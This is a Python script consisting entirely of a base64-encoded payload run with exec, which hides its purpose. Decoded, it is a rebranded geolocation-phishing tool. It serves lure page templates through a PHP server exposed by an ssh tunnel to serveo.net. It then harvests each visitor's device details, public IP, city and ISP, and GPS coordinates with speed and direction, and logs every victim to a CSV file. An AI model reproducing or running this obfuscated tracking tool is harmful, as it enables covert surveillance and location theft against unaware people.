import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQoKaW1wb3J0IG9zCmltcG9ydCBjc3YKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQganNvbgppbXBvcnQgYXJncGFyc2UKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdWJwcm9jZXNzIGFzIHN1YnAKClIgPSAnXDAzM1szMW0nICMgcmVkCkcgPSAnXDAzM1szMm0nICMgZ3JlZW4KQyA9ICdcMDMzWzM2bScgIyBjeWFuClcgPSAnXDAzM1swbScgICMgd2hpdGUKCnBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKCkKcGFyc2VyLmFkZF9hcmd1bWVudCgnLXMnLCAnLS1zdWJkb21haW4nLCBoZWxwPSdQcm92aWRlIFN1YmRvbWFpbiBmb3IgU2VydmVvIFVSTCAoIE9wdGlvbmFsICknKQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctaycsICctLWttbCcsIGhlbHA9J1Byb3ZpZGUgS01MIEZpbGVuYW1lICggT3B0aW9uYWwgKScpCnBhcnNlci5hZGRfYXJndW1lbnQoJy10JywgJy0tdHVubmVsJywgaGVscD0nU3BlY2lmeSBUdW5uZWwgTW9kZSBbIEF2YWlsYWJsZSA6IG1hbnVhbCBdJykKcGFyc2VyLmFkZF9hcmd1bWVudCgnLXAnLCAnLS1wb3J0JywgdHlwZT1pbnQsIGRlZmF1bHQ9ODA4MCwgaGVscD0nUG9ydCBmb3IgV2ViIFNlcnZlciBbIERlZmF1bHQgOiA4MDgwIF0nKQoKYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKc3ViZG9tID0gYXJncy5zdWJkb21haW4Ka21sX2ZuYW1lID0gYXJncy5rbWwKdHVubmVsX21vZGUgPSBhcmdzLnR1bm5lbApwb3J0ID0gYXJncy5wb3J0Cgpyb3cgPSBbXQpzaXRlID0gJycKaW5mbyA9ICcnCnJlc3VsdCA9ICcnCnZlcnNpb24gPSAnMS4yLjQnCgpkZWYgYmFubmVyKCk6CglwcmludCAoRyArCglyJycnCl9fX19fX19fX19fICAgICBfX19fX19fX19fX19fX19fX19fX18gICAgX19fX18gIF9fX19fX19fXyAgX19fXyAgX18uX19fIF9fX19fX18gICAgX19fX19fX18gClxfICAgX19fX18vICAgICBcX18gICAgX19fL1xfX19fX18gICBcICAvICBfICBcIFxfICAgX19fIFx8ICAgIHwvIF98ICAgfFwgICAgICBcICAvICBfX19fXy8gCiB8ICAgIF9fKSAgX19fX19fIHwgICAgfCAgICB8ICAgICAgIF8vIC8gIC9fXCAgXC8gICAgXCAgXC98ICAgICAgPCB8ICAgfC8gICB8ICAgXC8gICBcICBfX18gCiB8ICAgICBcICAvX19fX18vIHwgICAgfCAgICB8ICAgIHwgICBcLyAgICB8ICAgIFwgICAgIFxfX198ICAgIHwgIFx8ICAgLyAgICB8ICAgIFwgICAgXF9cICBcCiBcX19fICAvICAgICAgICAgIHxfX19ffCAgICB8X19fX3xfICAvXF9fX198X18gIC9cX19fX19fICAvX19fX3xfXyBcX19fXF9fX198X18gIC9cX19fX19fICAvCiAgICAgXC8gICAgICAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgICAgICBcLyAgICAgICAgXC8gICAgICAgIFwvICAgICAgICAgICBcLyAgICAgICAgXC8gICAgICAgICAnJycgKyBXKQoJcHJpbnQoJ1xuJyArIEcgKyAnWz5dJyArIEMgKyAnIENyZWF0ZWQgQnkgOiAnICsgVyArICdGU09DSUVUWSBBTEFTIFJPQkFOJykKCXByaW50KEcgKyAnWz5dJyArIEMgKyAnIFZlcnNpb24gICAgOiAnICsgVyArIHZlcnNpb24gKyAnXG4nKQoKZGVmIHZlcl9jaGVjaygpOgoJcHJpbnQoRyArICdbK10nICsgQyArICcgQ2hlY2tpbmcgZm9yIFVwZGF0ZXMuLi4uLicsIGVuZD0nJykKCXZlcl91cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RoZXdoaXRlaDR0L3NlZWtlci9tYXN0ZXIvdmVyc2lvbi50eHQnCgl0cnk6CgkJdmVyX3Jxc3QgPSByZXF1ZXN0cy5nZXQodmVyX3VybCkKCQl2ZXJfc2MgPSB2ZXJfcnFzdC5zdGF0dXNfY29kZQoJCWlmIHZlcl9zYyA9PSAyMDA6CgkJCWdpdGh1Yl92ZXIgPSB2ZXJfcnFzdC50ZXh0CgkJCWdpdGh1Yl92ZXIgPSBnaXRodWJfdmVyLnN0cmlwKCkKCgkJCWlmIHZlcnNpb24gPT0gZ2l0aHViX3ZlcjoKCQkJCXByaW50KEMgKyAnWycgKyBHICsgJyBVcC1Uby1EYXRlICcgKyBDICsnXScgKyAnXG4nKQoJCQllbHNlOgoJCQkJcHJpbnQoQyArICdbJyArIEcgKyAnIEF2YWlsYWJsZSA6IHt9ICcuZm9ybWF0KGdpdGh1Yl92ZXIpICsgQyArICddJyArICdcbicpCgkJZWxzZToKCQkJcHJpbnQoQyArICdbJyArIFIgKyAnIFN0YXR1cyA6IHt9ICcuZm9ybWF0KHZlcl9zYykgKyBDICsgJ10nICsgJ1xuJykKCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCQlwcmludCgnXG4nICsgUiArICdbLV0nICsgQyArICcgRXhjZXB0aW9uIDogJyArIFcgKyBzdHIoZSkpCgpkZWYgdHVubmVsX3NlbGVjdCgpOgoJaWYgdHVubmVsX21vZGUgPT0gTm9uZToKCQlzZXJ2ZW8oKQoJZWxpZiB0dW5uZWxfbW9kZSA9PSAnbWFudWFsJzoKCQlwcmludChHICsgJ1srXScgKyBDICsgJyBTdGFyIE5ncm9rIER1bHUgU2VjYXJhIE1hbnVhbCwgQmFuZ3NhZCBrYXUga2FuZyByZWNvZGUuLi4nICsgVyArICdcbicpCgllbHNlOgoJCXByaW50KFIgKyAnWytdJyArIEMgKyAnIEludmFsaWQgVHVubmVsIE1vZGUgU2VsZWN0ZWQsIENoZWNrIEhlbHAgWy1oLCAtLWhlbHBdJyArIFcgKyAnXG4nKQoJCWV4aXQoKQoKZGVmIHRlbXBsYXRlX3NlbGVjdCgpOgoJZ2xvYmFsIHNpdGUsIGluZm8sIHJlc3VsdAoJcHJpbnQoRyArICdbK10nICsgQyArICcgU2VsZWN0IGEgVGVtcGxhdGUgOiAnICsgVyArICdcbicpCgkKCXdpdGggb3BlbigndGVtcGxhdGUvdGVtcGxhdGVzLmpzb24nLCAncicpIGFzIHRlbXBsOgoJCXRlbXBsX2luZm8gPSB0ZW1wbC5yZWFkKCkKCQoJdGVtcGxfanNvbiA9IGpzb24ubG9hZHModGVtcGxfaW5mbykKCQoJZm9yIGl0ZW0gaW4gdGVtcGxfanNvblsndGVtcGxhdGVzJ106CgkJbmFtZSA9IGl0ZW1bJ25hbWUnXQoJCXByaW50KEcgKyAnW3t9XScuZm9ybWF0KHRlbXBsX2pzb25bJ3RlbXBsYXRlcyddLmluZGV4KGl0ZW0pKSArIEMgKyAnIHt9Jy5mb3JtYXQobmFtZSkgKyBXKQoJCglzZWxlY3RlZCA9IGludChpbnB1dChHICsgJ1s+XSAnICsgVykpCgkKCXRyeToKCQlzaXRlID0gdGVtcGxfanNvblsndGVtcGxhdGVzJ11bc2VsZWN0ZWRdWydkaXJfbmFtZSddCglleGNlcHQgSW5kZXhFcnJvcjoKCQlwcmludCgnXG4nICsgUiArICdbLV0nICsgQyArICcgSW52YWxpZCBJbnB1dCEnICsgVyArICdcbicpCgkJc3lzLmV4aXQoKQoJCglwcmludCgnXG4nICsgRyArICdbK10nICsgQyArICcgTG9hZGluZyB7fSBUZW1wbGF0ZS4uLicuZm9ybWF0KHRlbXBsX2pzb25bJ3RlbXBsYXRlcyddW3NlbGVjdGVkXVsnbmFtZSddKSArIFcgKyAnXG4nKQoJCgltb2R1bGUgPSB0ZW1wbF9qc29uWyd0ZW1wbGF0ZXMnXVtzZWxlY3RlZF1bJ21vZHVsZSddCglpZiBtb2R1bGUgPT0gVHJ1ZToKCQlpbXBfZmlsZSA9IHRlbXBsX2pzb25bJ3RlbXBsYXRlcyddW3NlbGVjdGVkXVsnaW1wb3J0X2ZpbGUnXQoJCWltcG9ydCBpbXBvcnRsaWIKCQlpbXBvcnRsaWIuaW1wb3J0X21vZHVsZSgndGVtcGxhdGUue30nLmZvcm1hdChpbXBfZmlsZSkpCgllbHNlOgoJCXBhc3MKCglpbmZvID0gJ3RlbXBsYXRlL3t9L3BocC9pbmZvLnR4dCcuZm9ybWF0KHNpdGUpCglyZXN1bHQgPSAndGVtcGxhdGUve30vcGhwL3Jlc3VsdC50eHQnLmZvcm1hdChzaXRlKQoKZGVmIHNlcnZlbygpOgoJZ2xvYmFsIHNpdGUsIHN1YmRvbQoJZmxhZyA9IEZhbHNlCgoJcHJpbnQoRyArICdbK10nICsgQyArICcgQ2hlY2tpbmcgU2VydmVvIFN0YXR1cy4uLicsIGVuZD0nJykKCgl0cnk6CgkJdGltZS5zbGVlcCgxKQoJCXJxc3QgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc2VydmVvLm5ldCcsIHRpbWVvdXQ9NSkKCQlzYyA9IHJxc3Quc3RhdHVzX2NvZGUKCQlpZiBzYyA9PSAyMDA6CgkJCXByaW50KEMgKyAnWycgKyBHICsgJyBVUCAnICsgQyArICddJyArIFcgKyAnXG4nKQoJCWVsc2U6CgkJCXByaW50KEMgKyAnWycgKyBSICsgJ1N0YXR1cyA6IHt9Jy5mb3JtYXQoc2MpICsgQyArICddJyArIFcgKyAnXG4nKQoJCQlleGl0KCkKCWV4Y2VwdCByZXF1ZXN0cy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQoQyArICdbJyArIFIgKyAnIERPV04gJyArIEMgKyAnXScgKyBXICsgJ1xuJykKCQlleGl0KCkKCQkJCglwcmludChHICsgJ1srXScgKyBDICsgJyBHZXR0aW5nIFNlcnZlbyBVUkwuLi4nICsgVyArICdcbicpCglpZiBzdWJkb20gaXMgTm9uZToKCQl3aXRoIG9wZW4oJ2xvZ3Mvc2VydmVvLnR4dCcsICd3JykgYXMgdG1wZmlsZToKCQkJcHJvYyA9IHN1YnAuUG9wZW4oWydzc2gnLCAnLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8nLCAnLVInLCAnODA6bG9jYWxob3N0Ont9Jy5mb3JtYXQocG9ydCksICdzZXJ2ZW8ubmV0J10sIHN0ZG91dD10bXBmaWxlLCBzdGRlcnI9dG1wZmlsZSwgc3RkaW49c3VicC5QSVBFKQoJZWxzZToKCQl3aXRoIG9wZW4oJ2xvZ3Mvc2VydmVvLnR4dCcsICd3JykgYXMgdG1wZmlsZToKCQkJcHJvYyA9IHN1YnAuUG9wZW4oWydzc2gnLCAnLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8nLCAnLVInLCAne30uc2VydmVvLm5ldDo4MDpsb2NhbGhvc3Q6e30nLmZvcm1hdChzdWJkb20sIHBvcnQpLCAnc2VydmVvLm5ldCddLCBzdGRvdXQ9dG1wZmlsZSwgc3RkZXJyPXRtcGZpbGUsIHN0ZGluPXN1YnAuUElQRSkKCQoJd2hpbGUgVHJ1ZToKCQl3aXRoIG9wZW4oJ2xvZ3Mvc2VydmVvLnR4dCcsICdyJykgYXMgdG1wZmlsZToKCQkJdHJ5OgoJCQkJc3Rkb3V0ID0gdG1wZmlsZS5yZWFkbGluZXMoKQoJCQkJaWYgZmxhZyA9PSBGYWxzZToKCQkJCQlmb3IgZWxlbSBpbiBzdGRvdXQ6CgkJCQkJCWlmICdIVFRQJyBpbiBlbGVtOgoJCQkJCQkJZWxlbSA9IGVsZW0uc3BsaXQoJyAnKQoJCQkJCQkJdXJsID0gZWxlbVs0XS5zdHJpcCgpCgkJCQkJCQl1cmwgPSB1cmwgKyAnL3t9LycuZm9ybWF0KHNpdGUpCgkJCQkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBVUkwgOiAnICsgVyArIHVybCkKCQkJCQkJCWZsYWcgPSBUcnVlCgkJCQkJCWVsc2U6CgkJCQkJCQlwYXNzCgkJCQllbGlmIGZsYWcgPT0gVHJ1ZToKCQkJCQlicmVhawoJCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6CgkJCQlwcmludChlKQoJCQkJcGFzcwoJCXRpbWUuc2xlZXAoMikKCmRlZiBzZXJ2ZXIoKToKCWdsb2JhbCBzaXRlCglwcmludCgnXG4nICsgRyArICdbK10nICsgQyArICcgUG9ydCA6ICcrIFcgKyBzdHIocG9ydCkpCglwcmludCgnXG4nICsgRyArICdbK10nICsgQyArICcgU3RhcnRpbmcgUEhQIFNlcnZlci4uLi4uLicgKyBXLCBlbmQ9JycpCgl3aXRoIG9wZW4oJ2xvZ3MvcGhwLmxvZycsICd3JykgYXMgcGhwbG9nOgoJCXN1YnAuUG9wZW4oWydwaHAnLCAnLVMnLCAnMC4wLjAuMDp7fScuZm9ybWF0KHBvcnQpLCAnLXQnLCAndGVtcGxhdGUve30vJy5mb3JtYXQoc2l0ZSldLCBzdGRvdXQ9cGhwbG9nLCBzdGRlcnI9cGhwbG9nKQoJCXRpbWUuc2xlZXAoMykKCXRyeToKCQlwaHBfcnFzdCA9IHJlcXVlc3RzLmdldCgnaHR0cDovLzAuMC4wLjA6e30vaW5kZXguaHRtbCcuZm9ybWF0KHBvcnQpKQoJCXBocF9zYyA9IHBocF9ycXN0LnN0YXR1c19jb2RlCgkJaWYgcGhwX3NjID09IDIwMDoKCQkJcHJpbnQoQyArICdbJyArIEcgKyAnIFN1Y2Nlc3MgJyArIEMgKyAnXScgKyBXKQoJCWVsc2U6CgkJCXByaW50KEMgKyAnWycgKyBSICsgJ1N0YXR1cyA6IHt9Jy5mb3JtYXQocGhwX3NjKSArIEMgKyAnXScgKyBXKQoJZXhjZXB0IHJlcXVlc3RzLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludChDICsgJ1snICsgUiArICcgRmFpbGVkICcgKyBDICsgJ10nICsgVykKCQlRdWl0KCkKCmRlZiB3YWl0KCk6CglwcmludGVkID0gRmFsc2UKCXdoaWxlIFRydWU6CgkJdGltZS5zbGVlcCgyKQoJCXNpemUgPSBvcy5wYXRoLmdldHNpemUocmVzdWx0KQoJCWlmIHNpemUgPT0gMCBhbmQgcHJpbnRlZCA9PSBGYWxzZToKCQkJcHJpbnQoJ1xuJyArIEcgKyAnWytdJyArIEMgKyAnIFdhaXRpbmcgZm9yIFVzZXIgSW50ZXJhY3Rpb24uLi4nICsgVyArICdcbicpCgkJCXByaW50ZWQgPSBUcnVlCgkJaWYgc2l6ZSA+IDA6CgkJCW1haW4oKQoKZGVmIG1haW4oKToKCWdsb2JhbCBpbmZvLCByZXN1bHQsIHJvdywgdmFyX2xhdCwgdmFyX2xvbgoJdHJ5OgoJCXJvdyA9IFtdCgkJd2l0aCBvcGVuIChpbmZvLCAncicpIGFzIGZpbGUyOgoJCQlmaWxlMiA9IGZpbGUyLnJlYWQoKQoJCQlqc29uMyA9IGpzb24ubG9hZHMoZmlsZTIpCgkJCWZvciB2YWx1ZSBpbiBqc29uM1snZGV2J106CgoJCQkJdmFyX29zID0gdmFsdWVbJ29zJ10KCQkJCXZhcl9wbGF0Zm9ybSA9IHZhbHVlWydwbGF0Zm9ybSddCgkJCQl0cnk6CgkJCQkJdmFyX2NvcmVzID0gdmFsdWVbJ2NvcmVzJ10KCQkJCWV4Y2VwdCBUeXBlRXJyb3I6CgkJCQkJdmFyX2NvcmVzID0gJ05vdCBBdmFpbGFibGUnCgkJCQl2YXJfcmFtID0gdmFsdWVbJ3JhbSddCgkJCQl2YXJfdmVuZG9yID0gdmFsdWVbJ3ZlbmRvciddCgkJCQl2YXJfcmVuZGVyID0gdmFsdWVbJ3JlbmRlciddCgkJCQl2YXJfcmVzID0gdmFsdWVbJ3dkJ10gKyAneCcgKyB2YWx1ZVsnaHQnXQoJCQkJdmFyX2Jyb3dzZXIgPSB2YWx1ZVsnYnJvd3NlciddCgkJCQl2YXJfaXAgPSB2YWx1ZVsnaXAnXQoKCQkJCXJvdy5hcHBlbmQodmFyX29zKQoJCQkJcm93LmFwcGVuZCh2YXJfcGxhdGZvcm0pIAoJCQkJcm93LmFwcGVuZCh2YXJfY29yZXMpIAoJCQkJcm93LmFwcGVuZCh2YXJfcmFtKSAKCQkJCXJvdy5hcHBlbmQodmFyX3ZlbmRvcikKCQkJCXJvdy5hcHBlbmQodmFyX3JlbmRlcikKCQkJCXJvdy5hcHBlbmQodmFyX3JlcykKCQkJCXJvdy5hcHBlbmQodmFyX2Jyb3dzZXIpCgkJCQlyb3cuYXBwZW5kKHZhcl9pcCkKCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBEZXZpY2UgSW5mb3JtYXRpb24gOiAnICsgVyArICdcbicpCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBPUyAgICAgICAgIDogJyArIFcgKyB2YXJfb3MpCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBQbGF0Zm9ybSAgIDogJyArIFcgKyB2YXJfcGxhdGZvcm0pCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBDUFUgQ29yZXMgIDogJyArIFcgKyB2YXJfY29yZXMpCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBSQU0gICAgICAgIDogJyArIFcgKyB2YXJfcmFtKQoJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgR1BVIFZlbmRvciA6ICcgKyBXICsgdmFyX3ZlbmRvcikKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIEdQVSAgICAgICAgOiAnICsgVyArIHZhcl9yZW5kZXIpCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBSZXNvbHV0aW9uIDogJyArIFcgKyB2YXJfcmVzKQoJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgQnJvd3NlciAgICA6ICcgKyBXICsgdmFyX2Jyb3dzZXIpCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBQdWJsaWMgSVAgIDogJyArIFcgKyB2YXJfaXApCgoJCQkJcnFzdCA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2ZyZWUuaXB3aG9pcy5pby9qc29uL3t9Jy5mb3JtYXQodmFyX2lwKSkKCQkJCXNjID0gcnFzdC5zdGF0dXNfY29kZQoKCQkJCWlmIHNjID09IDIwMDoKCQkJCQlkYXRhID0gcnFzdC50ZXh0CgkJCQkJZGF0YSA9IGpzb24ubG9hZHMoZGF0YSkKCQkJCQl2YXJfY29udGluZW50ID0gc3RyKGRhdGFbJ2NvbnRpbmVudCddKQoJCQkJCXZhcl9jb3VudHJ5ID0gc3RyKGRhdGFbJ2NvdW50cnknXSkKCQkJCQl2YXJfcmVnaW9uID0gc3RyKGRhdGFbJ3JlZ2lvbiddKQoJCQkJCXZhcl9jaXR5ID0gc3RyKGRhdGFbJ2NpdHknXSkKCQkJCQl2YXJfb3JnID0gc3RyKGRhdGFbJ29yZyddKQoJCQkJCXZhcl9pc3AgPSBzdHIoZGF0YVsnaXNwJ10pCgoJCQkJCXJvdy5hcHBlbmQodmFyX2NvbnRpbmVudCkKCQkJCQlyb3cuYXBwZW5kKHZhcl9jb3VudHJ5KQoJCQkJCXJvdy5hcHBlbmQodmFyX3JlZ2lvbikKCQkJCQlyb3cuYXBwZW5kKHZhcl9jaXR5KQoJCQkJCXJvdy5hcHBlbmQodmFyX29yZykKCQkJCQlyb3cuYXBwZW5kKHZhcl9pc3ApCgoJCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIENvbnRpbmVudCAgOiAnICsgVyArIHZhcl9jb250aW5lbnQpCgkJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgQ291bnRyeSAgICA6ICcgKyBXICsgdmFyX2NvdW50cnkpCgkJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgUmVnaW9uICAgICA6ICcgKyBXICsgdmFyX3JlZ2lvbikKCQkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBDaXR5ICAgICAgIDogJyArIFcgKyB2YXJfY2l0eSkKCQkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBPcmcgICAgICAgIDogJyArIFcgKyB2YXJfb3JnKQoJCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIElTUCAgICAgICAgOiAnICsgVyArIHZhcl9pc3ApCglleGNlcHQgVmFsdWVFcnJvcjoKCQlwYXNzCgkKCXRyeToKCQl3aXRoIG9wZW4gKHJlc3VsdCwgJ3InKSBhcyBmaWxlOgoJCQlmaWxlID0gZmlsZS5yZWFkKCkKCQkJanNvbjIgPSBqc29uLmxvYWRzKGZpbGUpCgkJCWZvciB2YWx1ZSBpbiBqc29uMlsnaW5mbyddOgoJCQkJdmFyX2xhdCA9IHZhbHVlWydsYXQnXSArICcgZGVnJwoJCQkJdmFyX2xvbiA9IHZhbHVlWydsb24nXSArICcgZGVnJwoJCQkJdmFyX2FjYyA9IHZhbHVlWydhY2MnXSArICcgbScKCgkJCQl2YXJfYWx0ID0gdmFsdWVbJ2FsdCddCgkJCQlpZiB2YXJfYWx0ID09ICcnOgoJCQkJCXZhcl9hbHQgPSAnTm90IEF2YWlsYWJsZScKCQkJCWVsc2U6CgkJCQkJdmFyX2FsdCA9PSB2YWx1ZVsnYWx0J10gKyAnIG0nCgkJCQkKCQkJCXZhcl9kaXIgPSB2YWx1ZVsnZGlyJ10KCQkJCWlmIHZhcl9kaXIgPT0gJyc6CgkJCQkJdmFyX2RpciA9ICdOb3QgQXZhaWxhYmxlJwoJCQkJZWxzZToKCQkJCQl2YXJfZGlyID0gdmFsdWVbJ2RpciddICsgJyBkZWcnCgkJCQkKCQkJCXZhcl9zcGQgPSB2YWx1ZVsnc3BkJ10KCQkJCWlmIHZhcl9zcGQgPT0gJyc6CgkJCQkJdmFyX3NwZCA9ICdOb3QgQXZhaWxhYmxlJwoJCQkJZWxzZToKCQkJCQl2YXJfc3BkID0gdmFsdWVbJ3NwZCddICsgJyBtL3MnCgoJCQkJcm93LmFwcGVuZCh2YXJfbGF0KQoJCQkJcm93LmFwcGVuZCh2YXJfbG9uKQoJCQkJcm93LmFwcGVuZCh2YXJfYWNjKQoJCQkJcm93LmFwcGVuZCh2YXJfYWx0KQoJCQkJcm93LmFwcGVuZCh2YXJfZGlyKQoJCQkJcm93LmFwcGVuZCh2YXJfc3BkKQoKCQkJCXByaW50ICgnXG4nICsgRyArICdbK10nICsgQyArICcgTG9jYXRpb24gSW5mb3JtYXRpb24gOiAnICsgVyArICdcbicpCgkJCQlwcmludCAoRyArICdbK10nICsgQyArICcgTGF0aXR1ZGUgIDogJyArIFcgKyB2YXJfbGF0KQoJCQkJcHJpbnQgKEcgKyAnWytdJyArIEMgKyAnIExvbmdpdHVkZSA6ICcgKyBXICsgdmFyX2xvbikKCQkJCXByaW50IChHICsgJ1srXScgKyBDICsgJyBBY2N1cmFjeSAgOiAnICsgVyArIHZhcl9hY2MpCgkJCQlwcmludCAoRyArICdbK10nICsgQyArICcgQWx0aXR1ZGUgIDogJyArIFcgKyB2YXJfYWx0KQoJCQkJcHJpbnQgKEcgKyAnWytdJyArIEMgKyAnIERpcmVjdGlvbiA6ICcgKyBXICsgdmFyX2RpcikKCQkJCXByaW50IChHICsgJ1srXScgKyBDICsgJyBTcGVlZCAgICAgOiAnICsgVyArIHZhcl9zcGQpCglleGNlcHQgVmFsdWVFcnJvcjoKCQllcnJvciA9IGZpbGUKCQlwcmludCAoJ1xuJyArIFIgKyAnWy1dICcgKyBXICsgZXJyb3IpCgkJcmVwZWF0KCkKCglwcmludCAoJ1xuJyArIEcgKyAnWytdJyArIEMgKyAnIEdvb2dsZSBNYXBzLi4uLi4uLi4uLi4uLi4uLi46ICcgKyBXICsgJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20vbWFwcy9wbGFjZS8nICsgdmFyX2xhdC5zdHJpcCgnIGRlZycpICsgJysnICsgdmFyX2xvbi5zdHJpcCgnIGRlZycpKQoJCglpZiBrbWxfZm5hbWUgaXMgbm90IE5vbmU6CgkJa21sb3V0KHZhcl9sYXQsIHZhcl9sb24pCgoJY3N2b3V0KCkKCXJlcGVhdCgpCgpkZWYga21sb3V0KHZhcl9sYXQsIHZhcl9sb24pOgoJd2l0aCBvcGVuKCd0ZW1wbGF0ZS9zYW1wbGUua21sJywgJ3InKSBhcyBrbWxfc2FtcGxlOgoJCWttbF9zYW1wbGVfZGF0YSA9IGttbF9zYW1wbGUucmVhZCgpCgoJa21sX3NhbXBsZV9kYXRhID0ga21sX3NhbXBsZV9kYXRhLnJlcGxhY2UoJ0xPTkdJVFVERScsIHZhcl9sb24uc3RyaXAoJyBkZWcnKSkKCWttbF9zYW1wbGVfZGF0YSA9IGttbF9zYW1wbGVfZGF0YS5yZXBsYWNlKCdMQVRJVFVERScsIHZhcl9sYXQuc3RyaXAoJyBkZWcnKSkKCgl3aXRoIG9wZW4oJ3t9LmttbCcuZm9ybWF0KGttbF9mbmFtZSksICd3JykgYXMga21sX2dlbjoKCQlrbWxfZ2VuLndyaXRlKGttbF9zYW1wbGVfZGF0YSkKCglwcmludChHICsgJ1srXScgKyBDICsgJyBLTUwgRmlsZSBHZW5lcmF0ZWQuLi4uLi4uLi4uOiAnICsgVyArIG9zLmdldGN3ZCgpICsgJy97fS5rbWwnLmZvcm1hdChrbWxfZm5hbWUpKQoKZGVmIGNzdm91dCgpOgoJZ2xvYmFsIHJvdwoJd2l0aCBvcGVuKCdkYi9yZXN1bHRzLmNzdicsICdhJykgYXMgY3N2ZmlsZToKCQl3cml0ZXIgPSBjc3Yud3JpdGVyKGNzdmZpbGUpCgkJd3JpdGVyLndyaXRlcm93KHJvdykKCXByaW50KEcgKyAnWytdJyArIEMgKyAnIE5ldyBFbnRyeSBBZGRlZCBpbiBEYXRhYmFzZS46ICcgKyBXICsgb3MuZ2V0Y3dkKCkgKyAnL2RiL3Jlc3VsdHMuY3N2JykKCmRlZiBjbGVhcigpOgoJZ2xvYmFsIHJlc3VsdAoJd2l0aCBvcGVuIChyZXN1bHQsICd3KycpOiBwYXNzCgl3aXRoIG9wZW4gKGluZm8sICd3KycpOiBwYXNzCgpkZWYgcmVwZWF0KCk6CgljbGVhcigpCgl3YWl0KCkKCW1haW4oKQoKZGVmIFF1aXQoKToKCWdsb2JhbCByZXN1bHQKCXdpdGggb3BlbiAocmVzdWx0LCAndysnKTogcGFzcwoJb3Muc3lzdGVtKCdwa2lsbCBwaHAnKQoJZXhpdCgpCgp0cnk6CgliYW5uZXIoKQoJdmVyX2NoZWNrKCkKCXR1bm5lbF9zZWxlY3QoKQoJdGVtcGxhdGVfc2VsZWN0KCkKCXNlcnZlcigpCgl3YWl0KCkKCW1haW4oKQoKZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJcHJpbnQgKCdcbicgKyBSICsgJ1shXScgKyBDICsgJyBLZXlib2FyZCBJbnRlcnJ1cHQuJyArIFcpCglRdWl0KCk='))